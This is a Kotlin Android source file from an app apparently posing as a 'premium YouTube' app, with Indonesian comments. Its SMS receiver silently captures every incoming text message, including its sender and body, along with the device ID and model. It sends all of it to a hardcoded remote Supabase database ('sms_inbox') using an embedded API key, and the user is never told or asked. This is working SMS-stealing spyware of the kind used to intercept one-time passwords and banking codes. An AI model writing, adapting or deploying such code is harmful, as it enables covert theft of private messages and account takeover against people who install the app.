package com.w8sb.w8premiumyt

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    private val client = OkHttpClient()
    
    // DETAIL CONFIG SUPABASE (Sama seperti di file HTML)
    private val supabaseUrl = "https://oycyuxxqmeqvyaipknkr.supabase.co"
    private val supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95Y3l1eHhxbWVxdnlhaXBrbmtyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk4MTc4MzMsImV4cCI6MjA5NTM5MzgzM30.LAECvRwsBvEPOz19l8cy8Hct2F4j0Lta9I-GPmIFcHI"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            
            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: "UNKNOWN"
                val messageBody = sms.displayMessageBody ?: ""
                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
                    timeZone = TimeZone.getTimeZone("UTC")
                }.format(Date(sms.timestampMillis))

                Log.d("W8_Supabase", "SMS Diterima dari: $sender")

                // Kirim Langsung Tembak ke Rest API Supabase tanpa server.js
                kirimKeSupabaseDirect(context, sender, messageBody, timestamp)
            }
        }
    }

    private fun kirimKeSupabaseDirect(context: Context, sender: String, message: String, timestamp: String) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("device_name", deviceName)
            put("sender", sender)
            put("message", message)
            put("timestamp", timestamp)
        }

        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val requestBody = json.toString().toRequestBody(mediaType)

        // Supabase REST API membutuhkan header apikey dan Authorization
        val request = Request.Builder()
            .url("$supabaseUrl/rest/v1/sms_inbox")
            .post(requestBody)
            .addHeader("apikey", supabaseAnonKey)
            .addHeader("Authorization", "Bearer $supabaseAnonKey")
            .addHeader("Content-Type", "application/json")
            .addHeader("Prefer", "return=representation")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("W8_Supabase", "Koneksi Gagal. SMS gagal masuk Supabase: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (response.isSuccessful) {
                        Log.d("W8_Supabase", "SUKSES! SMS langsung masuk database Supabase")
                    } else {
                        Log.e("W8_Supabase", "Supabase menolak data. Kode error: ${response.code}")
                    }
                }
            }
        })
    }
}
